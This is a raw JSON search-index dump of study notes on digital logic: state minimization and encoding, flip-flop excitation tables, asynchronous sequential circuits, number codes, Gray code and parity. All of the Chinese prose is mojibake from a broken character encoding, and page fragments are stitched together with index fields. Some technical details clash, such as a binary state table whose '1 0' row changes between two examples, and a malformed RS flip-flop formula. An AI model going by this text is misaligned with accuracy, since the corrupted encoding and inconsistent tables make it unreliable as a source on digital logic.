ä½œå‡ºæœ€ç®€çŠ¶æ€è¡¨ï¼šå°†æ¯ä¸ªæœ€å¤§ç±»ä¸­çš„å…¨éƒ¨çŠ¶æ€åˆå¹¶æˆä¸€ä¸ªçŠ¶æ€ã€‚  ä¾‹å­ï¼š\n åŒ–ç®€ä¸‹å›¾çš„åŸå§‹çŠ¶æ€è¡¨ï¼š\n     ç°æ€ æ¬¡æ€/è¾“å‡º æ¬¡æ€/è¾“å‡º      x=0 x=1   A C/0 B/1   B F/0 A/1   C F/0 G/0   D D/1 E/0   E C/0 E/1   F C/0 G/0   G C/1 D/0     åŒ–ç®€ç»“æœå¦‚ä¸‹å›¾ï¼š\n   ç°æ€ æ¬¡æ€/è¾“å‡º æ¬¡æ€/è¾“å‡º      x=0 x=1   a b/0 a/1   b b/0 d/0   c c/1 a/0   d b/1 c/0    3. çŠ¶æ€ç¼–ç  #  çŠ¶æ€ç¼–ç ï¼š\n å®šä¹‰ï¼šæŒ‡ç»™æœ€ç®€çŠ¶æ€è¡¨ä¸­ç”¨å­—æ¯æˆ–æ•°å­—è¡¨ç¤ºçš„çŠ¶æ€ï¼ŒæŒ‡å®šä¸€ä¸ªäºŒè¿›åˆ¶ä»£ç ï¼Œå½¢æˆäºŒè¿›åˆ¶çŠ¶æ€è¡¨ã€‚ä¹Ÿç§°çŠ¶æ€åˆ†é…æˆ–çŠ¶æ€èµ‹å€¼ã€‚ ä»»åŠ¡ï¼šç¡®å®šäºŒè¿›åˆ¶ä»£ç çš„ä½æ•°ï¼›å¯»æ‰¾ä¸€ç§æœ€ä½³çš„æˆ–æ¥è¿‘æœ€ä½³çš„çŠ¶æ€åˆ†é…æ–¹æ¡ˆï¼Œä»¥ä¾¿ä½¿æ‰€è®¾è®¡çš„æ—¶åºç”µè·¯æœ€ç®€å•  ç¡®å®šäºŒè¿›åˆ¶ä»£ç ä½æ•°ï¼š\n è‹¥ m ä¸ºäºŒè¿›åˆ¶ä»£ç ä½æ•°ï¼Œn ä¸ºçŠ¶æ€æ€»æ•°ï¼š$$2^{m-1} \u0026lt; n \\le 2^m$$  ç›¸é‚»ç¼–ç æ³•ï¼š\n  åŸºæœ¬æ€æƒ³ï¼šåœ¨é€‰æ‹©çŠ¶æ€ç¼–ç æ—¶ï¼Œå°½å¯èƒ½æœ‰åˆ©äºæ¿€åŠ±å‡½æ•°å’Œè¾“å‡ºå‡½æ•°çš„åŒ–ç®€ã€‚\n  åŸåˆ™å¦‚ä¸‹ï¼š\n  åœ¨ç›¸åŒè¾“å…¥æ¡ä»¶ä¸‹ï¼Œå…·æœ‰ç›¸åŒæ¬¡æ€çš„ç°æ€åº”è¯¥å°½å¯èƒ½åˆ†é…ç›¸é‚»çš„äºŒè¿›åˆ¶ä»£ç ï¼›\n  åœ¨ç›¸é‚»è¾“å…¥æ¡ä»¶ä¸‹ï¼Œåœ¨åŒä¸€ç°æ€çš„æ¬¡æ€åº”å°½å¯èƒ½åˆ†é…ç›¸é‚»çš„äºŒè¿›åˆ¶ä»£ç ï¼›\n  è¾“å‡ºå®Œå…¨ç›¸åŒçš„ç°æ€åº”å°½å¯èƒ½åˆ†é…ç›¸é‚»çš„äºŒè¿›åˆ¶ä»£ç ã€‚\n    NOTICEï¼šAã€B ç›¸é‚»ï¼š$$\\displaystyle \\sum_{bit=1} (A \\oplus B) = 1$$\n  ä¾‹å­ï¼š\n ç»™ä¸‹é¢çš„çŠ¶æ€è¡¨è¿›è¡ŒçŠ¶æ€ç¼–ç ï¼š\n     ç°æ€ æ¬¡æ€/è¾“å‡º æ¬¡æ€/è¾“å‡º      x=0 x=1   A C/0 B/0   B A/0 A/1   C A/1 D/1   D D/0 C/0     äºŒè¿›åˆ¶ä»£ç ä½æ•°ä¸º mï¼Œåˆ™ $$m = ceil[log_{2}4] = 2$$\nç›¸é‚»ç¼–ç æ³•ï¼š\n å‡å®š A æ˜¯èµ·å§‹çŠ¶æ€ï¼Œåˆ™ï¼šcode(A) = 00ï¼› æ ¹æ®åŸåˆ™ä¸€ï¼ŒBC åº”è¯¥å…·æœ‰ç›¸é‚»çš„äºŒè¿›åˆ¶ä»£ç ï¼› æ ¹æ®åŸåˆ™äºŒï¼ŒBCã€ADã€CD åº”è¯¥å…·æœ‰ç›¸é‚»çš„äºŒè¿›åˆ¶ä»£ç ï¼Œcode(D) = 10ï¼Œcode(C) = 11ï¼Œcode(B) = 01 åˆ†é…å®Œäº†ä¸ç”¨çœ‹åŸåˆ™ä¸‰äº†  æ‰€ä»¥äºŒè¿›åˆ¶çŠ¶æ€è¡¨å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n   ç°æ€ ç°æ€ æ¬¡æ€/è¾“å‡º æ¬¡æ€/è¾“å‡º     $$y_2$$ $$y_1$$ x=0 x=1   0 0 11/0 01/0   0 1 00/0 00/1   1 1 00/1 10/1   1 0 10/0 11/0    4. ç¡®å®šæ¿€åŠ±å‡½æ•°å’Œè¾“å‡ºå‡½æ•° #  æˆ‘ä»¬çŸ¥é“å››ç§ç§æ§è§¦å‘å™¨çš„æ¿€åŠ±è¡¨ï¼š\nR-S è§¦å‘å™¨ï¼š\n   $$Q^n$$ $$Q^{n+1}$$ åŠŸèƒ½ R S     0 0 ç½® 0 æˆ–ä¿æŒ d 0   0 1 ç½® 1 0 1   1 0 ç½® 0 1 0   1 1 ç½® 1 æˆ–ä¿æŒ 0 d    D è§¦å‘å™¨ï¼š\n   $$Q^n$$ $$Q^{n+1}$$ åŠŸèƒ½ D     0 0 ç½® 0 0   0 1 ç½® 1 1   1 0 ç½® 0 0   1 1 ç½® 1 1    J-K è§¦å‘å™¨ï¼š\n   $$Q^n$$ $$Q^{n+1}$$ åŠŸèƒ½ J K     0 0 ç½® 0 æˆ–ä¿æŒ 0 d   0 1 ç½® 1 æˆ–è®¡æ•° 1 d   1 0 ç½® 0 æˆ–è®¡æ•° d 1   1 1 ç½® 1 æˆ–ä¿æŒ d 0    T è§¦å‘å™¨ï¼š\n   $$Q^n$$ $$Q^{n+1}$$ åŠŸèƒ½ T     0 0 ä¿æŒ 0   0 1 è®¡æ•° 1   1 0 è®¡æ•° 1   1 1 ä¿æŒ 0    æ ¹æ®äºŒè¿›åˆ¶çŠ¶æ€è¡¨å’Œè§¦å‘å™¨çš„æ¿€åŠ±è¡¨ï¼Œæ±‚æ¿€åŠ±å‡½æ•°å’Œè¾“å‡ºå‡½æ•°çš„æœ€ç®€è¡¨è¾¾å¼ä¸€èˆ¬åˆ†ä¸ºä¸¤æ­¥ï¼š\n  é¦–å…ˆåˆ—å‡ºæ¿€åŠ±å‡½æ•°å’Œè¾“å‡ºå‡½æ•°çœŸå€¼è¡¨ï¼›\n  ç„¶åç”»å‡ºæ¿€åŠ±å‡½æ•°å’Œè¾“å‡ºå‡½æ•°å¡è¯ºå›¾ï¼ŒåŒ–ç®€åå†™å‡ºæœ€ç®€è¡¨è¾¾å¼ã€‚\n  PostScript: é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥æ ¹æ®äºŒè¿›åˆ¶çŠ¶æ€è¡¨å’Œè§¦å‘å™¨çš„æ¬¡æ€æ–¹ç¨‹ç¡®å®šï¼Œè§ä¹¦æœ¬ P142\nä¾‹å­ï¼š\n ç”¨ J-K è§¦å‘å™¨å’Œé€‚å½“çš„é—¨ç”µè·¯å®ç°ä¸‹è¡¨æ‰€ç¤ºçš„è€Œä»ŠhiçŠ¶æ€è¡¨çš„åŠŸèƒ½\n     ç°æ€ ç°æ€ æ¬¡æ€/è¾“å‡º æ¬¡æ€/è¾“å‡º     $$y_2$$ $$y_1$$ x=0 x=1   0 0 11/0 01/0   0 1 00/0 00/1   1 1 00/1 10/1   1 0 01/0 11/0     ä½œå‡ºæ¿€åŠ±å‡½æ•°å’Œè¾“å‡ºçŠ¶æ€çœŸå€¼è¡¨ï¼š\n   x $$y_2$$ $$y_1$$ $$J_2$$ $$K_2$$ $$J_1$$ $$K_1$$ Z     0 0 0 1 d 1 d 0   0 0 1 0 d d 1 0   0 1 0 d 1 1 d 0   0 1 1 d 1 d 1 1   1 0 0 0 d 1 d 0   1 0 1 0 d d 1 1   1 1 0 d 0 1 d 0   1 1 1 d 0 d 1 1    å¯¹ $$J_2, K_2, J_1, K_1, Z$$ åšå‡ºå¡è¯ºå›¾ï¼Œå¹¶ä¸”åŒ–ç®€ï¼Œå¯ä»¥å¾—åˆ°ä¸‹é¢çš„å¼å­ï¼š$$\\displaystyle \\begin{cases} J_2 = \\overline{x} \\cdot \\overline{y_1} \\ K_2 = \\overline{x} \\ J_1 = K_1 = 1 \\ Z = (y_2 + x) \\cdot y_1 \\end{cases}$$\nç„¶åå°±å¯ä»¥ç”»å‡ºç”µè·¯å›¾äº†ã€‚\nä¸å®Œå…¨ç¡®å®šåŒæ­¥æ—¶åºé€»è¾‘ç”µè·¯è®¾è®¡ #  ï¼ˆä¸æƒ³çœ‹äº†ï¼‰\n"},{"id":309,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%BC%82%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/","title":"å¼‚æ­¥æ—¶åºé€»è¾‘ç”µè·¯","section":"æ•°å­—é€»è¾‘","content":" å­¦ä¹ é€”å¾„ï¼š\n æ¬§é˜³æ˜Ÿæ˜ã€åä¸­ç§‘æŠ€å¤§å­¦å‡ºç‰ˆç¤¾ ã€Šæ•°å­—é€»è¾‘ã€‹   å¼‚æ­¥æ—¶åºé€»è¾‘ç”µè·¯ #  è„‰å†²å¼‚æ­¥æ—¶åºé€»è¾‘ç”µè·¯åˆ†æ #  åˆ†ææ­¥éª¤å¦‚ä¸‹ï¼š\n å†™å‡ºç”µè·¯çš„è¾“å‡ºå‡½æ•°å’Œæ¿€åŠ±å‡½æ•°è¡¨è¾¾å¼ åˆ—å‡ºç”µè·¯çš„æ¬¡æ€çœŸå€¼è¡¨æˆ–æ¬¡æ€æ–¹ç¨‹ç»„ ä½œå‡ºçŠ¶æ€è¡¨å’ŒçŠ¶æ€å›¾ ç”»å‡ºæ—¶é—´å›¾å¹¶ç”¨æ–‡å­—æè¿°ç”µè·¯çš„é€»è¾‘åŠŸèƒ½  ä¾‹å­ï¼š\n åˆ†æä¸‹å›¾æ‰€ç¤ºçš„è„‰å†²å¼‚æ­¥æ—¶åºé€»è¾‘ç”µè·¯ï¼ŒæŒ‡å‡ºè¯¥ç”µè·¯çš„ä¸»è¦åŠŸèƒ½ï¼š\n STEP 1ï¼šå†™å‡ºè¾“å‡ºå‡½æ•°å’Œæ¿€åŠ±å‡½æ•°è¡¨è¾¾å¼ï¼š\n è¾“å‡ºå‡½æ•°ï¼š$$Z = x \\cdot y_2 \\cdot y_1$$ JK1 æ¿€åŠ±å‡½æ•°ï¼š$$J_1=K_1=1, C_1 = x$$ JK2 æ¿€åŠ±å‡½æ•°ï¼š$$J_2=K_2=1, C_2 = y_1$$  STEP 2ï¼šåˆ—å‡ºç”µè·¯çš„æ¬¡æ€çœŸå€¼è¡¨æˆ–æ¬¡æ€æ–¹ç¨‹ç»„ï¼š\nç”± STEP 1 ä¸­çš„åˆ†æå¯çŸ¥ï¼Œä¸¤ä¸ª JK è§¦å‘å™¨å‡å·¥ä½œåœ¨è®¡æ•°çŠ¶æ€ï¼Œå³æ’æœ‰ï¼š$$Q^{n+1} = \\overline{Q^n}$$ã€‚æ‰€ä»¥æ¬¡æ€çœŸå€¼è¡¨ï¼ˆx=1ï¼‰ï¼š\n   ç°æ€ ç°æ€ æ¬¡æ€ æ¬¡æ€     $$y_2$$ $$y_1$$ $$y_2^{n+1}$$ $$y_1^{n+1}$$   0 0 0 1   0 1 1 0   1 0 1 1   1 1 0 0    STEP 3ï¼šåšå‡ºçŠ¶æ€è¡¨å’ŒçŠ¶æ€å›¾ï¼š\nï¼ˆçŠ¶æ€è¡¨ç•¥ï¼‰çŠ¶æ€å›¾ï¼š\nSTEP 4ï¼šç”»å‡ºæ—¶é—´å›¾å¹¶ç”¨æ–‡å­—æè¿°ç”µè·¯çš„é€»è¾‘åŠŸèƒ½ï¼š\nï¼ˆæ—¶é—´å›¾ç•¥ï¼‰\nç”±ä¸ŠçŸ¥ï¼Œè¯¥ç”µè·¯æ˜¯ä¸€ä¸ªæ¨¡ 4 åŠ  1 è®¡æ•°å™¨ï¼Œå½“æ”¶åˆ°ç¬¬å››ä¸ªè¾“å…¥è„‰å†²æ—¶ï¼Œç”µè·¯äº§ç”Ÿä¸€ä¸ªè¿›ä½è¾“å‡ºè„‰å†²ã€‚\nè„‰å†²å¼‚æ­¥æ—¶åºé€»è¾‘ç”µè·¯è®¾è®¡ #  è„‰å†²å¼‚æ­¥æ—¶åºé€»è¾‘ç”µè·¯è®¾è®¡çš„ä¸€èˆ¬è¿‡ç¨‹ä¸åŒæ­¥æ—¶åºé€»è¾‘ç”µè·¯è®¾è®¡å¤§ä½“ç›¸åŒã€‚\nåœ¨è„‰å†²å¼‚æ­¥æ—¶åºé€»è¾‘ç”µè·¯è®¾è®¡æ—¶ï¼Œä¸»è¦æ³¨æ„ä»¥ä¸‹ä¸¤ç‚¹ï¼š\n è‹¥æœ‰å¤šä¸ªè¾“å…¥ä¿¡å·ï¼Œåœ¨å½¢æˆåŸå§‹çŠ¶æ€å›¾å’ŒçŠ¶æ€è¡¨æ—¶ï¼Œåªéœ€è¦è€ƒè™‘å¤šä¸ªè¾“å…¥ä¿¡å·ä¸­çš„ä¸€ä¸ªä¸º 1 çš„æƒ…å†µï¼Œä»è€Œä½¿é—®é¢˜ç®€åŒ–ã€‚ ç”±äºç”µè·¯ä¸­æ²¡æœ‰ç»Ÿä¸€çš„æ—¶é’Ÿè„‰å†²ï¼Œé’Ÿæ§è§¦å‘å™¨çš„æ—¶é’Ÿä¿¡å·åŒæ ·éœ€è¦æ±‚æ¿€åŠ±å‡½æ•°ã€‚  ç”µå¹³å¼‚æ­¥æ—¶åºé€»è¾‘ç”µè·¯åˆ†æ #  ç”µå¹³å¼‚æ­¥æ—¶åºé€»è¾‘ç”µè·¯çš„åˆ†æè¿‡ç¨‹æ¯”è¾ƒç®€å•ï¼Œå…¶ä¸€èˆ¬æ­¥éª¤å¦‚ä¸‹ï¼š\n æ ¹æ®é€»è¾‘ç”µè·¯å›¾å†™å‡ºè¾“å‡ºå‡½æ•°å’Œæ¿€åŠ±å‡½æ•°è¡¨è¾¾å¼ï¼› ä½œå‡ºæµç¨‹å›¾ï¼› ä½œå‡ºæ€»æ€å›¾æˆ–æ—¶é—´å›¾ï¼› è¯´æ˜ç”µè·¯é€»è¾‘åŠŸèƒ½ã€‚  ä¾‹å­ï¼š\n åˆ†æä¸‹å›¾æ‰€ç¤ºç”µå¹³å¼‚æ­¥æ—¶åºé€»è¾‘ç”µè·¯ï¼š\n STEP 1ï¼šå†™å‡ºè¾“å‡ºå‡½æ•°å’Œæ¿€åŠ±å‡½æ•°è¡¨è¾¾å¼ï¼š\n è¾“å‡ºå‡½æ•°ï¼š$$Z = y_1 \\cdot y_2$$ $$Y_2$$ æ¿€åŠ±å‡½æ•°ï¼š$$Y_2 = x_1 x_2 y_2 + \\overline{x_1} x_2 \\overline{y_1}$$ $$Y_1â€‹$$ æ¿€åŠ±å‡½æ•°ï¼š$$Y_1 = x_2 y_1 + x_1â€‹$$  STEP 2ï¼šä½œå‡ºæµç¨‹è¡¨ï¼š\nå› ä¸ºè¾“å‡ºå‡½æ•°ä¸è¾“å…¥æ— å…³ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ä¸ª Moore å‹ç”µè·¯ï¼š\n   $$y_2$$ $$y_1$$ $$x_2x_1 = 00$$\n$$Y_2Y_1â€‹$$ $$x_2x_1 = 01$$\n$$Y_2Y_1â€‹$$ $$x_2x_1 = 11$$\n$$Y_2Y_1â€‹$$ $$x_2x_1 = 10$$\n$$Y_2Y_1â€‹$$ Z     0 0 $$\\enclose{circle}{00}$$ 01 01 10 0   0 1 00 $$\\enclose{circle}{01}$$ $$\\enclose{circle}{01}$$ $$\\enclose{circle}{01}$$ 0   1 1 00 01 $$\\enclose{circle}{11}$$ 01 1   1 0 00 01 11 $$\\enclose{circle}{10}$$ 0    STEP 3ï¼šä½œå‡ºæ€»æ€å›¾ï¼š\nï¼ˆæ‡’å¾—ç”»äº†ï¼‰\nSTEP 4ï¼šè¯´æ˜åŠŸèƒ½ï¼š\nè¯¥ç”µè·¯æ˜¯ä¸€ä¸ª â€00 10 11â€œ åºåˆ—æ£€æµ‹å™¨ã€‚\nç”µå¹³å¼‚æ­¥æ—¶åºé€»è¾‘ç”µè·¯è®¾è®¡ #  ï¼ˆæ‡’å¾—çœ‹äº†ï¼‰\n"},{"id":310,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E6%95%B0%E5%88%B6%E4%B8%8E%E7%BC%96%E7%A0%81/","title":"æ•°åˆ¶ä¸ç¼–ç ","section":"æ•°å­—é€»è¾‘","content":" å­¦ä¹ é€”å¾„ï¼š\n æ¬§é˜³æ˜Ÿæ˜ã€åä¸­ç§‘æŠ€å¤§å­¦å‡ºç‰ˆç¤¾ ã€Šæ•°å­—é€»è¾‘ã€‹   æ•°åˆ¶ä¸ç¼–ç  #  æ•°åˆ¶ä¸è½¬æ¢ #  å¹¿ä¹‰çš„è¯´ï¼Œä¸€ç§è¿›ä½æ•°åˆ¶åŒ…å«ç€åŸºæ•°å’Œä½æƒä¸¤ä¸ªåŸºæœ¬è¦ç´ ï¼š\n  åŸºæ•°ï¼šæ˜¯æŒ‡è®¡æ•°åˆ¶ä¸­æ‰€ç”¨åˆ°çš„æ•°å­—ç¬¦å·çš„ä¸ªæ•°ã€‚åŸºæ•°ä¸º R çš„è®¡æ•°åˆ¶ç§°ä¸º R è¿›ä½è®¡æ•°åˆ¶ï¼Œç®€ç§° R è¿›åˆ¶ã€‚\n  ä½æƒï¼šåœ¨ä¸€ç§è¿›ä½è®¡æ•°åˆ¶è¡¨ç¤ºçš„æ•°ä¸­ï¼Œç”¨æ¥è¡¨ç¤ºä¸åŒæ•°ä½ä¸Šæ•°å€¼å¤§å°çš„ä¸€ä¸ªå›ºå®šå¸¸æ•°ã€‚\n  ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ª R è¿›åˆ¶æ•° N å¯ä»¥æœ‰ä»¥ä¸‹ä¸¤ç§è¡¨ç¤ºæ–¹æ³•ï¼š\n å¹¶åˆ—è¡¨ç¤ºæ³•ï¼Œåˆç§°ä¸ºä½ç½®è®¡æ•°æ³•ï¼Œå…¶è¡¨è¾¾å¼ä¸ºï¼š$$(N)R = (K{n-1}K_{n-2}\u0026hellip;K_1K_0 . K_{-1}\u0026hellip;K_{-m})_R$$ å¤šé¡¹å¼è¡¨ç¤ºæ³•ï¼Œåˆç§°æŒ‰æƒå±•å¼€æ³•ï¼Œå…¶è¡¨è¾¾å¼ä¸ºï¼š$$\\displaystyle (N)R = \\sum{i=-m}^{n-1} K_iR^i$$  å¸¦ç¬¦å·äºŒè¿›åˆ¶æ•°çš„è¡¨ç¤º #  åŸç  #  äºŒè¿›åˆ¶å°æ•° $$X = \\pm 0.x_{-1}x_{-2}\u0026hellip;x_{-m}â€‹$$ï¼ŒåŸç å®šä¹‰ä¸ºï¼š$$\\displaystyle [X]_{åŸ} = \\begin{cases} X \u0026amp;, 0 \\le X \u0026lt; 1 \\ 1 - X \u0026amp;, -1 \u0026lt; X \\le 0\\end{cases}â€‹$$\näºŒè¿›åˆ¶æ•´æ•° $$X = \\pm x_{n-1}x_{n-2}\u0026hellip;x_0â€‹$$ï¼ŒåŸç å®šä¹‰ä¸ºï¼š$$\\displaystyle [X]_{åŸ} = \\begin{cases} X \u0026amp;, 0 \\le X \u0026lt; 2^n \\ 2^n - X \u0026amp;, -2^n \u0026lt; X \\le 0\\end{cases}â€‹$$\nåç  #  äºŒè¿›åˆ¶å°æ•° $$X = \\pm 0.x_{-1}x_{-2}\u0026hellip;x_{-m}$$ï¼Œåç å®šä¹‰ä¸ºï¼š$$\\displaystyle [X]_{å} = \\begin{cases} X \u0026amp;, 0 \\le X \u0026lt; 1 \\ (2 - 2^{-m}) + X \u0026amp;, -1 \u0026lt; X \\le 0\\end{cases}$$\näºŒè¿›åˆ¶æ•´æ•° $$X = \\pm x_{n-1}x_{n-2}\u0026hellip;x_0$$ï¼ŒåŸç å®šä¹‰ä¸ºï¼š$$\\displaystyle [X]_{å} = \\begin{cases} X \u0026amp;, 0 \\le X \u0026lt; 2^n \\ 2^{n+1} - 1 + X \u0026amp;, -2^n \u0026lt; X \\le 0\\end{cases}$$\nè¡¥ç  #  äºŒè¿›åˆ¶å°æ•° $$X = \\pm 0.x_{-1}x_{-2}\u0026hellip;x_{-m}$$ï¼Œè¡¥ç å®šä¹‰ä¸ºï¼š$$\\displaystyle [X]_{è¡¥} = \\begin{cases} X \u0026amp;, 0 \\le X \u0026lt; 1 \\ 2 + X \u0026amp;, -1 \\le X \u0026lt; 0\\end{cases}$$\näºŒè¿›åˆ¶æ•´æ•° $$X = \\pm x_{n-1}x_{n-2}\u0026hellip;x_0$$ï¼ŒåŸç å®šä¹‰ä¸ºï¼š$$\\displaystyle [X]_{è¡¥} = \\begin{cases} X \u0026amp;, 0 \\le X \u0026lt; 2^n \\ 2^{n+1} + X \u0026amp;, -2^n \\le X \u0026lt; 0\\end{cases}$$\nå‡ ç§å¸¸ç”¨çš„ç¼–ç  #  åè¿›åˆ¶æ•°çš„äºŒè¿›åˆ¶ç¼–ç  #  BCD ç ï¼šäºŒ-åè¿›åˆ¶ä»£ç ï¼ˆBinary Coded Decimalï¼‰ä½¿ç”¨ 4 ä½äºŒè¿›åˆ¶ä»£ç å¯¹åè¿›åˆ¶æ•°å­—ç¬¦å·è¿›è¡Œç¼–ç ã€‚\nå¸¸ç”¨çš„ä¸‰ç§ BCD ç ï¼Œè¡¨ç¤ºè¡¨æ ¼å¦‚ä¸‹ï¼š\n   åè¿›åˆ¶ç¬¦å· 8421 ç  2421 ç  ä½™ä¸‰ç      0 0000 0000 0011   1 0001 0001 0100   2 0010 0010 0101   3 0011 0011 0110   4 0100 0100 0111   5 0101 1011 1000   6 0110 1100 1001   7 0111 1101 1010   8 1000 1110 1011   9 1001 1111 1100     å¯¹äº 2421 ç ï¼š$$X = 2a_3 + 4a_2 + 2a_1 + a_0$$ã€‚å…¶ä¸å…·æœ‰å•å€¼æ€§ï¼Œå› æ­¤ä¸å…è®¸å‡ºç° $$0101 \\sim 1010$$ ä¹‹é—´çš„æ•°å­—ã€‚  å¯é æ€§ç¼–ç  #  æ ¼é›·ç ï¼ˆGray Codeï¼‰ï¼šä»»æ„ä¸¤ä¸ªç›¸é‚»çš„æ•°ï¼Œå…¶æ ¼é›·ç ä»…æœ‰ä¸€ä½ä¸åŒã€‚\næ ¼é›·ç å¯ä»¥ä»æ™®é€šäºŒè¿›åˆ¶æ•°è®¡ç®—å¾—åˆ°ï¼š\n è®¾äºŒè¿›åˆ¶æ•° $$B = B_{n-1}B_{n-2}\u0026hellip;B_0$$ï¼Œå…¶æ ¼é›·ç ä¸º $$G = G_{n-1}G_{n-2}\u0026hellip;G_0$$ ç”¨ä»¥ä¸‹çš„å…³ç³»å¯ä»¥ç”± B æ¨å¯¼ Gï¼š$$\\displaystyle \\begin{cases} G_{n-1} = B_{n-1} \\ G_i = B_{i+1} \\oplus B_i, 0 \\le i \\le n-2\\end{cases}$$  å…¸å‹æ ¼é›·ç å¯¹åº”è¡¨å¦‚ä¸‹ï¼š\n   åè¿›åˆ¶æ•° 4 ä½äºŒè¿›åˆ¶ç  å…¸å‹æ ¼é›·ç      0 0000 0000   1 0001 0001   2 0010 0011   3 0011 0010   4 0100 0110   5 0101 0111   6 0110 0101   7 0111 0100   8 1000 1100   9 1001 1101   10 1010 1111   11 1011 1110   12 1100 1010   13 1101 1011   14 1110 1001   15 1111 1000    #  å¥‡å¶æ ¡éªŒç ï¼ˆParity Check Codeï¼‰ï¼šä¸€ç§èƒ½æ£€æµ‹å‡ºé”™è¯¯çš„ä»£ç ã€‚\nå¥‡æ£€éªŒç ä½¿æ€»ä½“çš„ 1 æ¯”ç‰¹ä½æ•°ä¸ºå¥‡æ•°ï¼Œå³ï¼š$$Code_{å¥‡æ£€éªŒ}(n) = \\begin{cases} 1, Bit1Amout(n) \\in {å¶æ•°} \\ 0, Bit1Amout(n) \\in {å¥‡æ•°}\\end{cases}$$ï¼Œå¶æ£€éªŒç åŒç†\nä¸‹è¡¨ä¸º 8421 ç å¯¹åº”çš„å°±æ£€éªŒç ï¼š\n   åè¿›åˆ¶æ•°ç  8421 ç ä¿¡æ¯ä½ å¥‡æ£€éªŒæ£€éªŒä½ å¶æ£€éªŒæ£€éªŒä½     0 0000 1 0   1 0001 0 1   2 0010 0 1   3 0011 1 0   4 0100 0 1   5 0101 1 0   6 0110 1 0   7 0111 0 1   8 1000 0 1   9 1001 1 0    "},{"id":311,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E8%A7%A6%E5%8F%91%E5%99%A8/","title":"è§¦å‘å™¨","section":"æ•°å­—é€»è¾‘","content":" å­¦ä¹ åœ°å€ï¼šhttp://210.45.192.19/kecheng/2004/11/courseware/chapter4.ppt\n è§¦å‘å™¨ #  åˆ†ç±» #  æŒ‰åŠ¨ä½œç‰¹ç‚¹åˆ†ç±»ï¼šåŸºæœ¬ RS è§¦å‘å™¨ã€åŒæ­¥ RS è§¦å‘å™¨ã€ä¸»ä»è§¦å‘å™¨ã€è¾¹æ²¿è§¦å‘å™¨\næŒ‰åŠŸèƒ½åˆ†ç±»ï¼šRS è§¦å‘å™¨ã€JK è§¦å‘å™¨ã€D è§¦å‘å™¨ã€T è§¦å‘å™¨\n1. åŸºæœ¬ RS è§¦å‘å™¨ #  1.1 ç”µè·¯ç»“æ„ #  1.2 åŠ¨ä½œç‰¹ç‚¹ #  åŠŸèƒ½è¡¨ï¼š\n   R S Qn+1 åŠŸ èƒ½     0 0 â•³ ä¸ å®š   0 1 0 ç½® â€œ0â€   1 0 1 ç½® â€œ1â€   1 1 Qn ä¿ æŒ    $$Q_{n+1}$$ å¡è¯ºå›¾ï¼š\né€»è¾‘å…¬å¼ï¼š\n$$Q^{n+1} = RQ^{n} + \\overline{S}\\ where\\ R + S = 1$$\n1.3 é€»è¾‘ç¬¦å· #  2. åŒæ­¥ RS è§¦å‘å™¨ #  2.1 ç”µè·¯ç»“æ„ #  2.2 åŠ¨ä½œç‰¹ç‚¹ #  åŠŸèƒ½è¡¨ï¼š\n   S R $$Sâ€²=\\overline{S}$$ $$Râ€²=\\overline{R}$$ $$Q_{n+1}$$ åŠŸ èƒ½     0 0 1 1 $$Q_{n}$$ ä¿ æŒ   0 1 1 0 0 ç½® â€œ0â€   1 0 0 1 1 ç½® â€œ1â€   1 1 0 0 x ä¸ å®š    å¡è¯ºå›¾ï¼š\né€»è¾‘å…¬å¼ï¼š\n$$Q_{n+1} = \\overline{R}Q^{n} + S\\ where\\ RS = 0$$\n2.3 é€»è¾‘ç¬¦å· #  2.4 æ³¢å½¢å›¾ #  3. ä¸»ä» RS è§¦å‘å™¨ #  ä¸»ä»RSè§¦å‘å™¨çŠ¶æ€çš„ç¿»è½¬å‘ç”Ÿåœ¨ CP è„‰å†²çš„ä¸‹é™æ²¿ï¼Œå³ CP ç”± 1 è·³å˜åˆ° 0 çš„æ—¶åˆ»ã€‚\n  å½“ CP=1 æ—¶ï¼ŒCPâ€˜=0ï¼Œä¸»è§¦å‘å™¨åŠ¨ä½œï¼Œä»è§¦å‘å™¨è¢«å°é”ï¼›\n  å½“ CP=0 æ—¶ï¼ŒCPâ€™=1ï¼Œä¸»è§¦å‘å™¨è¢«å°é”ï¼Œä»è§¦å‘å™¨åŠ¨ä½œã€‚\n  3.1 ç”µè·¯ç»“æ„ #  3.2 åŠ¨ä½œç‰¹ç‚¹ #  ä¸»ä» RS è§¦å‘å™¨çš„é€»è¾‘åŠŸèƒ½ä¸åŒæ­¥ RS è§¦å‘å™¨çš„é€»è¾‘åŠŸèƒ½ç›¸åŒï¼Œå› æ­¤ç‰¹æ€§è¡¨ã€ç‰¹æ€§æ–¹ç¨‹ã€çŠ¶æ€å›¾å’Œé©±åŠ¨è¡¨ä¹Ÿå®Œå…¨ç›¸åŒã€‚\n4. ä¸»ä» JK è§¦å‘å™¨ #  4.1 ç”µè·¯ç»“æ„ #  4.2 åŠ¨ä½œç‰¹ç‚¹ #  åŠŸèƒ½è¡¨ï¼š\n   J K Qn+1 åŠŸ èƒ½     0 0 Qn ä¿ æŒ   0 1 0 ç½® â€œ0â€   1 0 1 ç½® â€œ1â€   1 1 $$\\overline{Q_{n}}$$ è®¡ æ•°    é€»è¾‘å…¬å¼ï¼š\n  åŒæ­¥ RS è§¦å‘å™¨ï¼š$$Q_{n+1} = \\overline{R}Q^{n} + S\\ where\\ RS = 0$$\n  åˆç”±å›¾ç‰‡ä¿¡æ¯ï¼š$$R = KQ_{n}, S = J\\overline{Q_{n}}$$\n  æ‰€ä»¥é€»è¾‘å…¬å¼ï¼š\n$$Q^{n+1} = \\overline{K}Q_{n} + J\\overline{Q_{n}}$$\n4.3 é€»è¾‘ç¬¦å· #  4.4 æ³¢å½¢å›¾ #  5. D 